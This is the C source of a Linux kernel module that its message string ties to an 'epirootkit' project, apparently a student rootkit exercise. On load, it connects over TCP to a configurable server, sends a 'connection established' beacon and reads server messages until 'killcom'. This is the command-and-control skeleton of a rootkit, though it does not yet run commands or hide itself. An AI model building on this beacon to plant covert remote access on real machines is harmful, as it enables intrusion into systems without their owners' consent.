#include <linux/module.h>
#include <linux/net.h>
#include <linux/inet.h>
#include <linux/delay.h>

static struct socket *sock = NULL;
static char *ip = "127.0.0.1";
static int port = 4242;
static char *message = "Message from epirootkit: connexion established";

module_param(ip, charp, 0644);
module_param(port, int, 0644);
module_param(message, charp, 0644);

MODULE_PARM_DESC(ip, "Server IPv4");
MODULE_PARM_DESC(port, "Server port");
MODULE_PARM_DESC(message, "Message to send to the server");

static int __init network_init(void)
{
	struct sockaddr_in addr = { 0 };
	struct msghdr msg = { 0 };
	struct kvec vec = { 0 };
	unsigned char ip_binary[4] = { 0 };
	int ret = 0;

	pr_info("network: insmoded\n");

	if ((ret = in4_pton(ip, -1, ip_binary, -1, NULL)) == 0) {
		pr_err("network: error converting the IPv4 address: %d\n", ret);
		return 1;
	}

	if ((ret = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock)) < 0) {
		pr_err("network: error creating the socket: %d\n", ret);
		return 1;
	}

	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);
	memcpy(&addr.sin_addr.s_addr, ip_binary, sizeof(addr.sin_addr.s_addr));

	do {
		ret = sock->ops->connect(sock, (struct sockaddr *)&addr, sizeof(addr), 0);
		if (ret < 0) {
			pr_err("network: error connecting to %s:%d (%d), retrying...\n", ip, port, ret);
			msleep(1000);
		}
	} while (ret < 0);

	vec.iov_base = (void *)message;
	vec.iov_len = strlen(message);

	do {
		ret = kernel_sendmsg(sock, &msg, &vec, 1, vec.iov_len);
		if (ret < 0) {
			pr_err("network: error sending the message: %d, retrying...\n", ret);
			msleep(1000);
		}
	} while (ret < 0);

	pr_info("network: message '%s' sent to %s:%d\n", message, ip, port);

	// Receive messages until "killcom"
	struct kvec recv_vec;
	char recv_buffer[1024] = { 0 };
	struct msghdr recv_msg;
	int received_count = 0;

	do {
		memset(recv_buffer, 0, sizeof(recv_buffer));
		memset(&recv_msg, 0, sizeof(recv_msg));
		recv_vec.iov_base = recv_buffer;
		recv_vec.iov_len = sizeof(recv_buffer) - 1;
		recv_msg.msg_flags = MSG_WAITALL;

		ret = kernel_recvmsg(sock, &recv_msg, &recv_vec, 1, recv_vec.iov_len, 0);
		if (ret < 0) {
			pr_err("network: error receiving the message: %d", ret);
			return 1;
		}

		recv_buffer[ret] = '\0';
		pr_info("network: received message from server: '%s'", recv_buffer);
		received_count++;

	} while (strcmp(recv_buffer, "killcom\n") != 0 && received_count < 10);

	pr_info("network: 'killcom' received, exiting loop\n");

	return 0;
}

static void __exit network_exit(void)
{
	if (sock) {
		sock_release(sock);
		sock = NULL;
	}

	pr_info("network: rmmoded\n");
}

module_init(network_init);
module_exit(network_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("STDBOOL");
MODULE_DESCRIPTION("Connect to a TCP server using ipv4 and send a message");